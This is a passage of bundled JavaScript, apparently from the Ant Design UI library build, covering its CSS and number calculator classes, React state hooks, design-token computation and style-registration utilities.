  })(AbstractCalculator),
  NumCalculator = (function (i) {
    _inherits(o, i);
    var a = _createSuper(o);
    function o(s) {
      var tt;
      return (
        _classCallCheck(this, o),
        (tt = a.call(this)),
        _defineProperty$1(_assertThisInitialized(tt), "result", 0),
        s instanceof o
          ? (tt.result = s.result)
          : typeof s == "number" && (tt.result = s),
        tt
      );
    }
    return (
      _createClass(o, [
        {
          key: "add",
          value: function (tt) {
            return (
              tt instanceof o
                ? (this.result += tt.result)
                : typeof tt == "number" && (this.result += tt),
              this
            );
          },
        },
        {
          key: "sub",
          value: function (tt) {
            return (
              tt instanceof o
                ? (this.result -= tt.result)
                : typeof tt == "number" && (this.result -= tt),
              this
            );
          },
        },
        {
          key: "mul",
          value: function (tt) {
            return (
              tt instanceof o
                ? (this.result *= tt.result)
                : typeof tt == "number" && (this.result *= tt),
              this
            );
          },
        },
        {
          key: "div",
          value: function (tt) {
            return (
              tt instanceof o
                ? (this.result /= tt.result)
                : typeof tt == "number" && (this.result /= tt),
              this
            );
          },
        },
        {
          key: "equal",
          value: function () {
            return this.result;
          },
        },
      ]),
      o
    );
  })(AbstractCalculator),
  genCalc = function (a, o) {
    var s = a === "css" ? CSSCalculator : NumCalculator;
    return function (tt) {
      return new s(tt, o);
    };
  },
  getCompVarPrefix = function (a, o) {
    return "".concat(
      [
        o,
        a
          .replace(/([A-Z]+)([A-Z][a-z]+)/g, "$1-$2")
          .replace(/([a-z])([A-Z])/g, "$1-$2"),
      ]
        .filter(Boolean)
        .join("-")
    );
  };
function useEvent(i) {
  var a = reactExports.useRef();
  a.current = i;
  var o = reactExports.useCallback(function () {
    for (
      var s, tt = arguments.length, nt = new Array(tt), ot = 0;
      ot < tt;
      ot++
    )
      nt[ot] = arguments[ot];
    return (s = a.current) === null || s === void 0
      ? void 0
      : s.call.apply(s, [a].concat(nt));
  }, []);
  return o;
}
function useSafeState(i) {
  var a = reactExports.useRef(!1),
    o = reactExports.useState(i),
    s = _slicedToArray$1(o, 2),
    tt = s[0],
    nt = s[1];
  reactExports.useEffect(function () {
    return (
      (a.current = !1),
      function () {
        a.current = !0;
      }
    );
  }, []);
  function ot(st, ft) {
    (ft && a.current) || nt(st);
  }
  return [tt, ot];
}
function hasValue(i) {
  return i !== void 0;
}
function useMergedState(i, a) {
  var o = a || {},
    s = o.defaultValue,
    tt = o.value,
    nt = o.onChange,
    ot = o.postState,
    st = useSafeState(function () {
      return hasValue(tt)
        ? tt
        : hasValue(s)
        ? typeof s == "function"
          ? s()
          : s
        : typeof i == "function"
        ? i()
        : i;
    }),
    ft = _slicedToArray$1(st, 2),
    ht = ft[0],
    gt = ft[1],
    St = tt !== void 0 ? tt : ht,
    vt = ot ? ot(St) : St,
    _t = useEvent(nt),
    Et = useSafeState([St]),
    Ct = _slicedToArray$1(Et, 2),
    Pt = Ct[0],
    bt = Ct[1];
  useLayoutUpdateEffect(
    function () {
      var yt = Pt[0];
      ht !== yt && _t(ht, yt);
    },
    [Pt]
  ),
    useLayoutUpdateEffect(
      function () {
        hasValue(tt) || gt(tt);
      },
      [tt]
    );
  var xt = useEvent(function (yt, wt) {
    gt(yt, wt), bt([St], wt);
  });
  return [vt, xt];
}
function getComponentToken(i, a, o, s) {
  var tt = _objectSpread2$1({}, a[i]);
  if (s != null && s.deprecatedTokens) {
    var nt = s.deprecatedTokens;
    nt.forEach(function (st) {
      var ft = _slicedToArray$1(st, 2),
        ht = ft[0],
        gt = ft[1];
      if ((tt != null && tt[ht]) || (tt != null && tt[gt])) {
        var St;
        ((St = tt[gt]) !== null && St !== void 0) ||
          (tt[gt] = tt == null ? void 0 : tt[ht]);
      }
    });
  }
  var ot = _objectSpread2$1(_objectSpread2$1({}, o), tt);
  return (
    Object.keys(ot).forEach(function (st) {
      ot[st] === a[st] && delete ot[st];
    }),
    ot
  );
}
var enableStatistic = typeof CSSINJS_STATISTIC < "u",
  recording = !0;
function merge() {
  for (var i = arguments.length, a = new Array(i), o = 0; o < i; o++)
    a[o] = arguments[o];
  if (!enableStatistic) return Object.assign.apply(Object, [{}].concat(a));
  recording = !1;
  var s = {};
  return (
    a.forEach(function (tt) {
      if (_typeof(tt) === "object") {
        var nt = Object.keys(tt);
        nt.forEach(function (ot) {
          Object.defineProperty(s, ot, {
            configurable: !0,
            enumerable: !0,
            get: function () {
              return tt[ot];
            },
          });
        });
      }
    }),
    (recording = !0),
    s
  );
}
var statistic = {};
function noop$1() {}
var statisticToken = function (a) {
  var o,
    s = a,
    tt = noop$1;
  return (
    enableStatistic &&
      typeof Proxy < "u" &&
      ((o = new Set()),
      (s = new Proxy(a, {
        get: function (ot, st) {
          if (recording) {
            var ft;
            (ft = o) === null || ft === void 0 || ft.add(st);
          }
          return ot[st];
        },
      })),
      (tt = function (ot, st) {
        var ft;
        statistic[ot] = {
          global: Array.from(o),
          component: _objectSpread2$1(
            _objectSpread2$1(
              {},
              (ft = statistic[ot]) === null || ft === void 0
                ? void 0
                : ft.component
            ),
            st
          ),
        };
      })),
    { token: s, keys: o, flush: tt }
  );
};
function getDefaultComponentToken(i, a, o) {
  if (typeof o == "function") {
    var s;
    return o(merge(a, (s = a[i]) !== null && s !== void 0 ? s : {}));
  }
  return o ?? {};
}
function genMaxMin(i) {
  return i === "js"
    ? { max: Math.max, min: Math.min }
    : {
        max: function () {
          for (var o = arguments.length, s = new Array(o), tt = 0; tt < o; tt++)
            s[tt] = arguments[tt];
          return "max(".concat(
            s
              .map(function (nt) {
                return unit$1(nt);
              })
              .join(","),
            ")"
          );
        },
        min: function () {
          for (var o = arguments.length, s = new Array(o), tt = 0; tt < o; tt++)
            s[tt] = arguments[tt];
          return "min(".concat(
            s
              .map(function (nt) {
                return unit$1(nt);
              })
              .join(","),
            ")"
          );
        },
      };
}
var BEAT_LIMIT = 1e3 * 60 * 10,
  ArrayKeyMap = (function () {
    function i() {
      _classCallCheck(this, i),
        _defineProperty$1(this, "map", new Map()),
        _defineProperty$1(this, "objectIDMap", new WeakMap()),
        _defineProperty$1(this, "nextID", 0),
        _defineProperty$1(this, "lastAccessBeat", new Map()),
        _defineProperty$1(this, "accessBeat", 0);
    }
    return (
      _createClass(i, [
        {
          key: "set",
          value: function (o, s) {
            this.clear();
            var tt = this.getCompositeKey(o);
            this.map.set(tt, s), this.lastAccessBeat.set(tt, Date.now());
          },
        },
        {
          key: "get",
          value: function (o) {
            var s = this.getCompositeKey(o),
              tt = this.map.get(s);
            return (
              this.lastAccessBeat.set(s, Date.now()), (this.accessBeat += 1), tt
            );
          },
        },
        {
          key: "getCompositeKey",
          value: function (o) {
            var s = this,
              tt = o.map(function (nt) {
                return nt && _typeof(nt) === "object"
                  ? "obj_".concat(s.getObjectID(nt))
                  : "".concat(_typeof(nt), "_").concat(nt);
              });
            return tt.join("|");
          },
        },
        {
          key: "getObjectID",
          value: function (o) {
            if (this.objectIDMap.has(o)) return this.objectIDMap.get(o);
            var s = this.nextID;
            return this.objectIDMap.set(o, s), (this.nextID += 1), s;
          },
        },
        {
          key: "clear",
          value: function () {
            var o = this;
            if (this.accessBeat > 1e4) {
              var s = Date.now();
              this.lastAccessBeat.forEach(function (tt, nt) {
                s - tt > BEAT_LIMIT &&
                  (o.map.delete(nt), o.lastAccessBeat.delete(nt));
              }),
                (this.accessBeat = 0);
            }
          },
        },
      ]),
      i
    );
  })(),
  uniqueMap = new ArrayKeyMap();
function useUniqueMemo(i, a) {
  return React$1.useMemo(function () {
    var o = uniqueMap.get(a);
    if (o) return o;
    var s = i();
    return uniqueMap.set(a, s), s;
  }, a);
}
var useDefaultCSP = function () {
  return {};
};
function genStyleUtils(i) {
  var a = i.useCSP,
    o = a === void 0 ? useDefaultCSP : a,
    s = i.useToken,
    tt = i.usePrefix,
    nt = i.getResetStyles,
    ot = i.getCommonStyle,
    st = i.getCompUnitless;
  function ft(vt, _t, Et, Ct) {
    var Pt = Array.isArray(vt) ? vt[0] : vt;
    function bt(It) {
      return ""
        .concat(String(Pt))
        .concat(It.slice(0, 1).toUpperCase())
        .concat(It.slice(1));
    }
    var xt = (Ct == null ? void 0 : Ct.unitless) || {},
      yt = typeof st == "function" ? st(vt) : {},
      wt = _objectSpread2$1(
        _objectSpread2$1({}, yt),
        {},
        _defineProperty$1({}, bt("zIndexPopup"), !0)
      );
    Object.keys(xt).forEach(function (It) {
      wt[bt(It)] = xt[It];
    });
    var $t = _objectSpread2$1(
        _objectSpread2$1({}, Ct),
        {},
        { unitless: wt, prefixToken: bt }
      ),
      kt = gt(vt, _t, Et, $t),
      Rt = ht(Pt, Et, $t);
    return function (It) {
      var Ot =
          arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : It,
        Nt = kt(It, Ot),
        zt = _slicedToArray$1(Nt, 2),
        Bt = zt[1],
        Wt = Rt(Ot),
        Gt = _slicedToArray$1(Wt, 2),
        Vt = Gt[0],
        Mt = Gt[1];
      return [Vt, Bt, Mt];
    };
  }
  function ht(vt, _t, Et) {
    var Ct = Et.unitless,
      Pt = Et.injectStyle,
      bt = Pt === void 0 ? !0 : Pt,
      xt = Et.prefixToken,
      yt = Et.ignore,
      wt = function (Rt) {
        var It = Rt.rootCls,
          Ot = Rt.cssVar,
          Nt = Ot === void 0 ? {} : Ot,
          zt = s(),
          Bt = zt.realToken;
        return (
          useCSSVarRegister(
            {
              path: [vt],
              prefix: Nt.prefix,
              key: Nt.key,
              unitless: Ct,
              ignore: yt,
              token: Bt,
              scope: It,
            },
            function () {
              var Wt = getDefaultComponentToken(vt, Bt, _t),
                Gt = getComponentToken(vt, Bt, Wt, {
                  deprecatedTokens: Et == null ? void 0 : Et.deprecatedTokens,
                });
              return (
                Object.keys(Wt).forEach(function (Vt) {
                  (Gt[xt(Vt)] = Gt[Vt]), delete Gt[Vt];
                }),
                Gt
              );
            }
          ),
          null
        );
      },
      $t = function (Rt) {
        var It = s(),
          Ot = It.cssVar;
        return [
          function (Nt) {
            return bt && Ot
              ? React$1.createElement(
                  React$1.Fragment,
                  null,
                  React$1.createElement(wt, {
                    rootCls: Rt,
                    cssVar: Ot,
                    component: vt,
                  }),
                  Nt
                )
              : Nt;
          },
          Ot == null ? void 0 : Ot.key,
        ];
      };
    return $t;
  }
  function gt(vt, _t, Et) {
    var Ct =
        arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : {},
      Pt = Array.isArray(vt) ? vt : [vt, vt],
      bt = _slicedToArray$1(Pt, 1),
      xt = bt[0],
      yt = Pt.join("-"),
      wt = i.layer || { name: "antd" };
    return function ($t) {
      var kt =
          arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : $t,
        Rt = s(),
        It = Rt.theme,
        Ot = Rt.realToken,
        Nt = Rt.hashId,
        zt = Rt.token,
        Bt = Rt.cssVar,
        Wt = tt(),
        Gt = Wt.rootPrefixCls,
        Vt = Wt.iconPrefixCls,
        Mt = o(),
        Ft = Bt ? "css" : "js",
        Tt = useUniqueMemo(
          function () {
            var Ht = new Set();
            return (
              Bt &&
                Object.keys(Ct.unitless || {}).forEach(function (Kt) {
                  Ht.add(token2CSSVar(Kt, Bt.prefix)),
                    Ht.add(token2CSSVar(Kt, getCompVarPrefix(xt, Bt.prefix)));
                }),
              genCalc(Ft, Ht)
            );
          },
          [Ft, xt, Bt == null ? void 0 : Bt.prefix]
        ),
        At = genMaxMin(Ft),
        Lt = At.max,
        jt = At.min,
        Dt = {
          theme: It,
          token: zt,
          hashId: Nt,
          nonce: function () {
            return Mt.nonce;
          },
          clientOnly: Ct.clientOnly,
          layer: wt,
          order: Ct.order || -999,
        };
      typeof nt == "function" &&
        useStyleRegister(
          _objectSpread2$1(
            _objectSpread2$1({}, Dt),
            {},
            { clientOnly: !1, path: ["Shared", Gt] }
          ),
          function () {
            return nt(zt, {
              prefix: { rootPrefixCls: Gt, iconPrefixCls: Vt },
              csp: Mt,
            });
          }
        );
      var Ut = useStyleRegister(
        _objectSpread2$1(_objectSpread2$1({}, Dt), {}, { path: [yt, $t, Vt] }),
        function () {
          if (Ct.injectStyle === !1) return [];
          var Ht = statisticToken(zt),
            Kt = Ht.token,
            qt = Ht.flush,
            Qt = getDefaultComponentToken(xt, Ot, Et),
            Zt = ".".concat($t),
            Jt = getComponentToken(xt, Ot, Qt, {
              deprecatedTokens: Ct.deprecatedTokens,
            });
          Bt &&
            Qt &&
            _typeof(Qt) === "object" &&
            Object.keys(Qt).forEach(function (tr) {
              Qt[tr] = "var(".concat(
                token2CSSVar(tr, getCompVarPrefix(xt, Bt.prefix)),
                ")"
              );
            });
          var er = merge(
              Kt,
              {
                componentCls: Zt,
                prefixCls: $t,
                iconCls: ".".concat(Vt),
                antCls: ".".concat(Gt),
                calc: Tt,
                max: Lt,
                min: jt,
              },
              Bt ? Qt : Jt
            ),
            sr = _t(er, {
              hashId: Nt,
              prefixCls: $t,
              rootPrefixCls: Gt,
              iconPrefixCls: Vt,
            });
          qt(xt, Jt);
          var nr =
            typeof ot == "function" ? ot(er, $t, kt, Ct.resetFont) : null;
          return [Ct.resetStyle === !1 ? null : nr, sr];
        }
      );
      return [Ut, Nt];
    };
  }
  function St(vt, _t, Et) {
    var Ct =
        arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : {},
      Pt = gt(
        vt,
        _t,
        Et,
        _objectSpread2$1({ resetStyle: !1, order: -998 }, Ct)
      ),
      bt = function (yt) {
        var wt = yt.prefixCls,
          $t = yt.rootCls,
          kt = $t === void 0 ? wt : $t;
        return Pt(wt, kt), null;
      };
    return bt;
  }
  return {
    genStyleHooks: ft,
    genSubStyleComponent: St,
    genComponentStyleHook: gt,
  };
}
const PresetColors = [
    "blue",
    "purple",
    "cyan",
    "green",
    "magenta",
    "pink",
    "red",
    "orange",
    "yellow",
    "volcano",
    "geekblue",
    "lime",
    "gold",
  ],
  version$1 = "5.22.7";
function isStableColor(i) {
  return i >= 0 && i <= 255;
}
function getAlphaColor(i, a) {
  const { r: o, g: s, b: tt, a: nt } = new TinyColor(i).toRgb();
  if (nt < 1) return i;
  const { r: ot, g: st, b: ft } = new TinyColor(a).toRgb();
  for (let ht = 0.01; ht <= 1; ht += 0.01) {
    const gt = Math.round((o - ot * (1 - ht)) / ht),
      St = Math.round((s - st * (1 - ht)) / ht),
      vt = Math.round((tt - ft * (1 - ht)) / ht);
    if (isStableColor(gt) && isStableColor(St) && isStableColor(vt))
      return new TinyColor({
        r: gt,
        g: St,
        b: vt,
        a: Math.round(ht * 100) / 100,
      }).toRgbString();
  }
  return new TinyColor({ r: o, g: s, b: tt, a: 1 }).toRgbString();
}
var __rest$e = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
function formatToken(i) {
  const { override: a } = i,
    o = __rest$e(i, ["override"]),
    s = Object.assign({}, a);
  Object.keys(seedToken).forEach((vt) => {
    delete s[vt];
  });
  const tt = Object.assign(Object.assign({}, o), s),
    nt = 480,
    ot = 576,
    st = 768,
    ft = 992,
    ht = 1200,
    gt = 1600;
  if (tt.motion === !1) {
    const vt = "0s";
    (tt.motionDurationFast = vt),
      (tt.motionDurationMid = vt),
      (tt.motionDurationSlow = vt);
  }
  return Object.assign(
    Object.assign(Object.assign({}, tt), {
      colorFillContent: tt.colorFillSecondary,
      colorFillContentHover: tt.colorFill,
      colorFillAlter: tt.colorFillQuaternary,
      colorBgContainerDisabled: tt.colorFillTertiary,
      colorBorderBg: tt.colorBgContainer,
      colorSplit: getAlphaColor(tt.colorBorderSecondary, tt.colorBgContainer),
      colorTextPlaceholder: tt.colorTextQuaternary,
      colorTextDisabled: tt.colorTextQuaternary,
      colorTextHeading: tt.colorText,
      colorTextLabel: tt.colorTextSecondary,
      colorTextDescription: tt.colorTextTertiary,
      colorTextLightSolid: tt.colorWhite,
      colorHighlight: tt.colorError,
      colorBgTextHover: tt.colorFillSecondary,
      colorBgTextActive: tt.colorFill,
      colorIcon: tt.colorTextTertiary,
      colorIconHover: tt.colorText,
      colorErrorOutline: getAlphaColor(tt.colorErrorBg, tt.colorBgContainer),
      colorWarningOutline: getAlphaColor(
        tt.colorWarningBg,
        tt.colorBgContainer
      ),
      fontSizeIcon: tt.fontSizeSM,
      lineWidthFocus: tt.lineWidth * 3,
      lineWidth: tt.lineWidth,
      controlOutlineWidth: tt.lineWidth * 2,
      controlInteractiveSize: tt.controlHeight / 2,
      controlItemBgHover: tt.colorFillTertiary,
      controlItemBgActive: tt.colorPrimaryBg,
      controlItemBgActiveHover: tt.colorPrimaryBgHover,
      controlItemBgActiveDisabled: tt.colorFill,
      controlTmpOutline: tt.colorFillQuaternary,
      controlOutline: getAlphaColor(tt.colorPrimaryBg, tt.colorBgContainer),
      lineType: tt.lineType,
      borderRadius: tt.borderRadius,
      borderRadiusXS: tt.borderRadiusXS,
      borderRadiusSM: tt.borderRadiusSM,
      borderRadiusLG: tt.borderRadiusLG,
      fontWeightStrong: 600,
      opacityLoading: 0.65,
      linkDecoration: "none",
      linkHoverDecoration: "none",
      linkFocusDecoration: "none",
      controlPaddingHorizontal: 12,
      controlPaddingHorizontalSM: 8,
      paddingXXS: tt.sizeXXS,
      paddingXS: tt.sizeXS,
      paddingSM: tt.sizeSM,
      padding: tt.size,
      paddingMD: tt.sizeMD,
      paddingLG: tt.sizeLG,
      paddingXL: tt.sizeXL,
      paddingContentHorizontalLG: tt.sizeLG,
      paddingContentVerticalLG: tt.sizeMS,
      paddingContentHorizontal: tt.sizeMS,
      paddingContentVertical: tt.sizeSM,
      paddingContentHorizontalSM: tt.size,
      paddingContentVerticalSM: tt.sizeXS,
      marginXXS: tt.sizeXXS,
      marginXS: tt.sizeXS,
      marginSM: tt.sizeSM,
      margin: tt.size,
      marginMD: tt.sizeMD,
      marginLG: tt.sizeLG,
      marginXL: tt.sizeXL,
      marginXXL: tt.sizeXXL,
      boxShadow: `
      0 6px 16px 0 rgba(0, 0, 0, 0.08),
      0 3px 6px -4px rgba(0, 0, 0, 0.12),
      0 9px 28px 8px rgba(0, 0, 0, 0.05)
    `,
      boxShadowSecondary: `
      0 6px 16px 0 rgba(0, 0, 0, 0.08),
      0 3px 6px -4px rgba(0, 0, 0, 0.12),
      0 9px 28px 8px rgba(0, 0, 0, 0.05)
    `,
      boxShadowTertiary: `
      0 1px 2px 0 rgba(0, 0, 0, 0.03),
      0 1px 6px -1px rgba(0, 0, 0, 0.02),
      0 2px 4px 0 rgba(0, 0, 0, 0.02)
    `,
      screenXS: nt,
      screenXSMin: nt,
      screenXSMax: ot - 1,
      screenSM: ot,
      screenSMMin: ot,
      screenSMMax: st - 1,
      screenMD: st,
      screenMDMin: st,
      screenMDMax: ft - 1,
      screenLG: ft,
      screenLGMin: ft,
      screenLGMax: ht - 1,
      screenXL: ht,
      screenXLMin: ht,
      screenXLMax: gt - 1,
      screenXXL: gt,
      screenXXLMin: gt,
      boxShadowPopoverArrow: "2px 2px 5px rgba(0, 0, 0, 0.05)",
      boxShadowCard: `
      0 1px 2px -2px ${new TinyColor("rgba(0, 0, 0, 0.16)").toRgbString()},
      0 3px 6px 0 ${new TinyColor("rgba(0, 0, 0, 0.12)").toRgbString()},
      0 5px 12px 4px ${new TinyColor("rgba(0, 0, 0, 0.09)").toRgbString()}
    `,
      boxShadowDrawerRight: `
      -6px 0 16px 0 rgba(0, 0, 0, 0.08),
      -3px 0 6px -4px rgba(0, 0, 0, 0.12),
      -9px 0 28px 8px rgba(0, 0, 0, 0.05)
    `,
      boxShadowDrawerLeft: `
      6px 0 16px 0 rgba(0, 0, 0, 0.08),
      3px 0 6px -4px rgba(0, 0, 0, 0.12),
      9px 0 28px 8px rgba(0, 0, 0, 0.05)
    `,
      boxShadowDrawerUp: `
      0 6px 16px 0 rgba(0, 0, 0, 0.08),
      0 3px 6px -4px rgba(0, 0, 0, 0.12),
      0 9px 28px 8px rgba(0, 0, 0, 0.05)
    `,
      boxShadowDrawerDown: `
      0 -6px 16px 0 rgba(0, 0, 0, 0.08),
      0 -3px 6px -4px rgba(0, 0, 0, 0.12),
      0 -9px 28px 8px rgba(0, 0, 0, 0.05)
    `,
      boxShadowTabsOverflowLeft: "inset 10px 0 8px -8px rgba(0, 0, 0, 0.08)",
      boxShadowTabsOverflowRight: "inset -10px 0 8px -8px rgba(0, 0, 0, 0.08)",
      boxShadowTabsOverflowTop: "inset 0 10px 8px -8px rgba(0, 0, 0, 0.08)",
      boxShadowTabsOverflowBottom: "inset 0 -10px 8px -8px rgba(0, 0, 0, 0.08)",
    }),
    s
  );
}
var __rest$d = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
const unitless = {
    lineHeight: !0,
    lineHeightSM: !0,
    lineHeightLG: !0,
    lineHeightHeading1: !0,
    lineHeightHeading2: !0,
    lineHeightHeading3: !0,
    lineHeightHeading4: !0,
    lineHeightHeading5: !0,
    opacityLoading: !0,
    fontWeightStrong: !0,
    zIndexPopupBase: !0,
    zIndexBase: !0,
    opacityImage: !0,
  },
  ignore = {
    size: !0,
    sizeSM: !0,
    sizeLG: !0,
    sizeMD: !0,
    sizeXS: !0,
    sizeXXS: !0,
    sizeMS: !0,
    sizeXL: !0,
    sizeXXL: !0,
    sizeUnit: !0,
    sizeStep: !0,
    motionBase: !0,
    motionUnit: !0,
  },
  preserve = {
    screenXS: !0,
    screenXSMin: !0,
    screenXSMax: !0,
    screenSM: !0,
    screenSMMin: !0,
    screenSMMax: !0,
    screenMD: !0,
    screenMDMin: !0,
    screenMDMax: !0,
    screenLG: !0,
    screenLGMin: !0,
    screenLGMax: !0,
    screenXL: !0,
    screenXLMin: !0,
    screenXLMax: !0,
    screenXXL: !0,
    screenXXLMin: !0,
  },
  getComputedToken = (i, a, o) => {
    const s = o.getDerivativeToken(i),
      { override: tt } = a,
      nt = __rest$d(a, ["override"]);
    let ot = Object.assign(Object.assign({}, s), { override: tt });
    return (
      (ot = formatToken(ot)),
      nt &&
        Object.entries(nt).forEach((st) => {
          let [ft, ht] = st;
          const { theme: gt } = ht,
            St = __rest$d(ht, ["theme"]);
          let vt = St;
          gt &&
            (vt = getComputedToken(
              Object.assign(Object.assign({}, ot), St),
              { override: St },
              gt
            )),
            (ot[ft] = vt);
        }),
      ot
    );
  };
function useToken() {
  const {
      token: i,
      hashed: a,
      theme: o,
      override: s,
      cssVar: tt,
    } = React$1.useContext(DesignTokenContext),
    nt = `${version$1}-${a || ""}`,
    ot = o || defaultTheme,
    [st, ft, ht] = useCacheToken(ot, [seedToken, i], {
      salt: nt,
      override: s,
      getComputedToken,
      formatToken,
      cssVar: tt && {
        prefix: tt.prefix,
        key: tt.key,
        unitless,
        ignore,
        preserve,
      },
    });
  return [ot, ht, a ? ft : "", st, tt];
}
const textEllipsis = {
    overflow: "hidden",
    whiteSpace: "nowrap",
    textOverflow: "ellipsis",
  },
  resetComponent = function (i) {
    let a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !1;
    return {
      boxSizing: "border-box",
      margin: 0,
      padding: 0,
      color: i.colorText,
      fontSize: i.fontSize,
      lineHeight: i.lineHeight,
      listStyle: "none",
      fontFamily: a ? "inherit" : i.fontFamily,
    };
  },
  resetIcon = () => ({
    display: "inline-flex",
    alignItems: "center",
    color: "inherit",
    fontStyle: "normal",
    lineHeight: 0,
    textAlign: "center",
    textTransform: "none",
    verticalAlign: "-0.125em",
    textRendering: "optimizeLegibility",
    "-webkit-font-smoothing": "antialiased",
    "-moz-osx-font-smoothing": "grayscale",
    "> *": { lineHeight: 1 },
    svg: { display: "inline-block" },
  }),
  clearFix = () => ({
    "&::before": { display: "table", content: '""' },
    "&::after": { display: "table", clear: "both", content: '""' },
  }),
  genLinkStyle = (i) => ({
    a: {
      color: i.colorLink,
      textDecoration: i.linkDecoration,
      backgroundColor: "transparent",
      outline: "none",
      cursor: "pointer",
      transition: `color ${i.motionDurationSlow}`,
      "-webkit-text-decoration-skip": "objects",
      "&:hover": { color: i.colorLinkHover },
      "&:active": { color: i.colorLinkActive },
      "&:active, &:hover": {
        textDecoration: i.linkHoverDecoration,
        outline: 0,
      },
      "&:focus": { textDecoration: i.linkFocusDecoration, outline: 0 },
      "&[disabled]": { color: i.colorTextDisabled, cursor: "not-allowed" },
    },
  }),
  genCommonStyle = (i, a, o, s) => {
    const tt = `[class^="${a}"], [class*=" ${a}"]`,
      nt = o ? `.${o}` : tt,
      ot = {
        boxSizing: "border-box",
        "&::before, &::after": { boxSizing: "border-box" },
      };
    let st = {};
    return (
      s !== !1 && (st = { fontFamily: i.fontFamily, fontSize: i.fontSize }),
      {
        [nt]: Object.assign(Object.assign(Object.assign({}, st), ot), {
          [tt]: ot,
        }),
      }
    );
  },
  genFocusOutline = (i) => ({
    outline: `${unit$1(i.lineWidthFocus)} solid ${i.colorPrimaryBorder}`,
    outlineOffset: 1,
    transition: "outline-offset 0s, outline 0s",
  }),
  genFocusStyle = (i) => ({
    "&:focus-visible": Object.assign({}, genFocusOutline(i)),
  }),
  genIconStyle = (i) => ({
    [`.${i}`]: Object.assign(Object.assign({}, resetIcon()), {
      [`.${i} .${i}-icon`]: { display: "block" },
    }),
  }),
  { genStyleHooks, genComponentStyleHook, genSubStyleComponent } =
    genStyleUtils({
      usePrefix: () => {
        const { getPrefixCls: i, iconPrefixCls: a } =
          reactExports.useContext(ConfigContext);
        return { rootPrefixCls: i(), iconPrefixCls: a };
      },
      useToken: () => {
        const [i, a, o, s, tt] = useToken();
        return { theme: i, realToken: a, hashId: o, token: s, cssVar: tt };
      },
      useCSP: () => {
        const { csp: i } = reactExports.useContext(ConfigContext);
        return i ?? {};
      },
      getResetStyles: (i, a) => {
        var o;
        return [
          { "&": genLinkStyle(i) },
          genIconStyle(
            (o = a == null ? void 0 : a.prefix.iconPrefixCls) !== null &&
              o !== void 0
              ? o
              : defaultIconPrefixCls
          ),
        ];
      },
      getCommonStyle: genCommonStyle,
      getCompUnitless: () => unitless,
    });
function genPresetColor(i, a) {
  return PresetColors.reduce((o, s) => {
    const tt = i[`${s}1`],
      nt = i[`${s}3`],
      ot = i[`${s}6`],
      st = i[`${s}7`];
    return Object.assign(
      Object.assign({}, o),
      a(s, {
        lightColor: tt,
        lightBorderColor: nt,
        darkColor: ot,
        textColor: st,
      })
    );
  }, {});
}
const useResetIconStyle = (i, a) => {
    const [o, s] = useToken();
    return useStyleRegister(
      {
        theme: o,
        token: s,
        hashId: "",
        path: ["ant-design-icons", i],
        nonce: () => (a == null ? void 0 : a.nonce),
        layer: { name: "antd" },
      },
      () => [genIconStyle(i)]
    );
  },
  fullClone$1 = Object.assign({}, React$2),
  { useId: useId$1 } = fullClone$1,
  useEmptyId = () => "",
  useThemeKey = typeof useId$1 > "u" ? useEmptyId : useId$1;
function useTheme(i, a, o) {
  var s;
  devUseWarning();
  const tt = i || {},
    nt =
      tt.inherit === !1 || !a
        ? Object.assign(Object.assign({}, defaultConfig), {
            hashed:
              (s = a == null ? void 0 : a.hashed) !== null && s !== void 0
                ? s
                : defaultConfig.hashed,
            cssVar: a == null ? void 0 : a.cssVar,
          })
        : a,
    ot = useThemeKey();
  return useMemo(
    () => {
      var st, ft;
      if (!i) return a;
      const ht = Object.assign({}, nt.components);
      Object.keys(i.components || {}).forEach((vt) => {
        ht[vt] = Object.assign(Object.assign({}, ht[vt]), i.components[vt]);
      });
      const gt = `css-var-${ot.replace(/:/g, "")}`,
        St =
          ((st = tt.cssVar) !== null && st !== void 0 ? st : nt.cssVar) &&
          Object.assign(
            Object.assign(
              Object.assign(
                { prefix: o == null ? void 0 : o.prefixCls },
                typeof nt.cssVar == "object" ? nt.cssVar : {}
              ),
              typeof tt.cssVar == "object" ? tt.cssVar : {}
            ),
            {
              key:
                (typeof tt.cssVar == "object" &&
                  ((ft = tt.cssVar) === null || ft === void 0
                    ? void 0
                    : ft.key)) ||
                gt,
            }
          );
      return Object.assign(Object.assign(Object.assign({}, nt), tt), {
        token: Object.assign(Object.assign({}, nt.token), tt.token),
        components: ht,
        cssVar: St,
      });
    },
    [tt, nt],
    (st, ft) =>
      st.some((ht, gt) => {
        const St = ft[gt];
        return !isEqual(ht, St, !0);
      })
  );
}
var _excluded$h = ["children"],
  Context$1 = reactExports.createContext({});
function MotionProvider(i) {
  var a = i.children,
    o = _objectWithoutProperties$1(i, _excluded$h);
  return reactExports.createElement(Context$1.Provider, { value: o }, a);
}
var DomWrapper = (function (i) {
  _inherits(o, i);
  var a = _createSuper(o);
  function o() {
    return _classCallCheck(this, o), a.apply(this, arguments);
  }
  return (
    _createClass(o, [
      {
        key: "render",
        value: function () {
          return this.props.children;
        },
      },
    ]),
    o
  );
})(reactExports.Component);
function useSyncState(i) {
  var a = reactExports.useReducer(function (st) {
      return st + 1;
    }, 0),
    o = _slicedToArray$1(a, 2),
    s = o[1],
    tt = reactExports.useRef(i),
    nt = useEvent(function () {
      return tt.current;
    }),
    ot = useEvent(function (st) {
      (tt.current = typeof st == "function" ? st(tt.current) : st), s();
    });
  return [nt, ot];
}
var STATUS_NONE = "none",
